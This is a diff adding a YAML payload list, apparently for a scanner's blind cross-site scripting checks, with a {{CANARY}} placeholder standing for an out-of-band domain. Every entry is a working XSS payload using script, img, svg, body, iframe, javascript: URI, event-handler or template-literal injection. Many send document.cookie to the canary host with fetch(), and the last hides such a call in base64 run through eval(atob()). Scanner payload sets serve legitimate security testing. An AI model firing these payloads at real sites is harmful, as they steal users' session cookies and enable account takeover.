@@ -1,0 +1,45 @@
+payloads:
+  # Script tag with OOB canary (replace {{CANARY}} with OOB domain)
+  - '<script src="https://{{CANARY}}/x"></script>'
+  - '<script>fetch("https://{{CANARY}}/"+document.cookie)</script>'
+  - '"><script src="https://{{CANARY}}/x"></script>'
+  - "'><script src='https://{{CANARY}}/x'></script>"
+
+  # Image onerror OOB
+  - '<img src=x onerror="fetch(''https://{{CANARY}}/?c=''+btoa(document.cookie))">'
+  - '"><img src=x onerror=fetch("https://{{CANARY}}/"+document.cookie)>'
+
+  # SVG onload OOB
+  - '<svg onload=fetch("https://{{CANARY}}/"+document.cookie)>'
+  - '"><svg onload="fetch(''https://{{CANARY}}/?d=''+document.domain)">'
+
+  # Body/HTML tag injection
+  - '<body onload=fetch("https://{{CANARY}}/"+document.cookie)>'
+  - '<!--><body onload=fetch("https://{{CANARY}}/x")>'
+
+  # JavaScript URI
+  - 'javascript:fetch("https://{{CANARY}}/"+document.cookie)'
+
+  # Event handlers (for attribute injection)
+  - '" onmouseover="fetch(''https://{{CANARY}}/'')" "'
+  - "' onmouseover='fetch(\"https://{{CANARY}}/\")' '"
+  - '" onfocus="fetch(''https://{{CANARY}}/'')" autofocus "'
+
+  # Template literal contexts
+  - '${fetch("https://{{CANARY}}/"+document.cookie)}'
+  - '`${fetch("https://{{CANARY}}/")}`'
+
+  # XSS polyglot with OOB
+  - 'jaVasCript:fetch/**/("https://{{CANARY}}/")'
+
+  # iframe src
+  - '<iframe src="javascript:fetch(''https://{{CANARY}}/'')">'
+
+  # Link href
+  - '<link rel=stylesheet href="https://{{CANARY}}/x.css">'
+
+  # Meta refresh with OOB
+  - '<meta http-equiv="refresh" content="0; url=https://{{CANARY}}/">'
+
+  # Blind XSS hunter style (XSS Hunter compatible)
+  - '"><script>eval(atob("ZmV0Y2goImh0dHBzOi8ve3tDQU5BUll9fS8iK2RvY3VtZW50LmNvb2tpZSk="))</script>'
